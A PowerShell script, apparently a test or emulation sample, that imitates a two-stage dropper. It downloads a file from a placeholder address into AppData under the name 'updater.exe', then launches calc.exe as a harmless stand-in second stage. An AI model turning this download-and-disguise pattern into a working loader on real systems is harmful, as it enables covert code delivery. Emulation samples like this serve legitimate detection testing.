
[CmdletBinding()]
param(
    [Parameter(Mandatory = $true)]
    [string]$TransferUrl = "https://192.0.2.20:8443/stage1.ps1",
    [string]$LocalPath = "$env:APPDATA\updater.exe",
    [string]$ActivityLog = "$env:TEMP\stage.log",
    [int]$RequestTimeout = 236
)
$ErrorActionPreference = "Stop"
$ProgressPreference = "SilentlyContinue"

function Invoke-Stage1Download {
    [CmdletBinding()]
    param(
        [string]$SourceUrl = '',
        [string]$DestinationPath = '',
        [int]$TimeoutSec = 236
    )

    Write-Verbose ("Downloading first stage from " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
    if (-not (Test-Path -Path $DestinationPath)) {
        throw "First stage was not written to disk"
    }
    return $DownloadedPath = $DestinationPath
}

function Invoke-Stage2Execution {
    [CmdletBinding()]
    param(
        [string]$StagedPath = "",
        [int]$DelaySeconds = 2
    )

    Write-Verbose ("Preparing handoff for " + $StagedPath)
    Start-Sleep -Seconds $DelaySeconds
    Start-Process -FilePath "calc.exe" -ErrorAction SilentlyContinue
    Write-Verbose "Second stage handoff complete"
    return $true
}

try {
    Write-Verbose "Starting multi-stage workflow"
    $ResultObject = Invoke-Stage1Download -SourceUrl $TransferUrl -DestinationPath $LocalPath -TimeoutSec $RequestTimeout
    if ($ResultObject) {
        $HandoffResult = Invoke-Stage2Execution -StagedPath $LocalPath
        Write-Verbose ("Handoff result: " + $HandoffResult)
    }
    else {
        Write-Warning "First stage did not complete"
    }
}
catch {
    Write-Warning "Multi-stage workflow failed: $($_.Exception.Message)"
}

$StageSummary = [ordered]@{
    Stage1 = "download"
    Stage2 = "handoff"
    Endpoint = $TransferUrl
    Destination = $LocalPath
    TimeoutSec = $RequestTimeout
}
$StageSummary | ConvertTo-Json -Depth 3 | Out-File -FilePath $ActivityLog -Append
Write-Verbose "Resolving configured target"
Write-Verbose "Applying operation timeout"
Write-Verbose "Writing diagnostic marker"
Write-Verbose "Collecting host metadata"
Write-Verbose "Preparing working directory"
Write-Verbose "Stage handoff finished"
Write-Verbose "Validating result"
Write-Output "stage 27 initialized"
Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append
